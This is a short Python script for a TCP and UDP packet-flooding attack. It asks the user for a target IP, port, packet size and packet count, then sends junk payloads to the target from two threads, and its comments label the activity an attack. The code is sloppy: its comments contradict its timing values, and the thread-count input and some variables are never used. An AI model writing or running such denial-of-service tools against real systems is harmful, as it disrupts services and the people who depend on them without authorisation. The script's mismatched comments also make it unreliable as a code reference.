import socket
import threading
import time

def send_tcp_packets(target_ip, target_port, packet_size, num_packets, interval):
    data = b'X' * packet_size  # Packet data

    for _ in range(num_packets):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.sendall(data)
            print("\033[92m[+] TCP Packet sent to", target_ip, "Port:", target_port)
        except Exception as e:
            print("\033[91m[!] TCP Error occurred:", e)
        finally:
            s.close()
        time.sleep(interval)

def send_udp_packets(target_ip, target_port, packet_size, num_packets, interval):
    data = b'X' * packet_size  # Packet data

    for _ in range(num_packets):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(data, (target_ip, target_port))
            print("\033[92m[-] UDP Packet sent to", target_ip, "Port:", target_port)
        except Exception as e:
            print("\033[91m[!] UDP Error occurred:", e)
        finally:
            s.close()
        time.sleep(interval)

def main():
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    packet_size = int(input("Enter packet size: "))
    num_packets = int(input("Enter number of packets: "))
    num_threads = int(input("Enter number of threads: "))

    # Calculate total time for sending all packets and interval between each batch
    total_time = 4 # 5 seconds
    interval = 1 / 5  # Send every 5 seconds

    # Calculate interval between each packet within a batch
    packet_interval = 1 / num_packets  # 2 seconds divided by number of packets

    # Create threads for TCP and UDP attacks
    tcp_thread = threading.Thread(target=send_tcp_packets, args=(target_ip, target_port, packet_size, num_packets, packet_interval))
    udp_thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port, packet_size, num_packets, packet_interval))

    # Start the attack
    tcp_thread.start()
    udp_thread.start()

if __name__ == "__main__":
    main()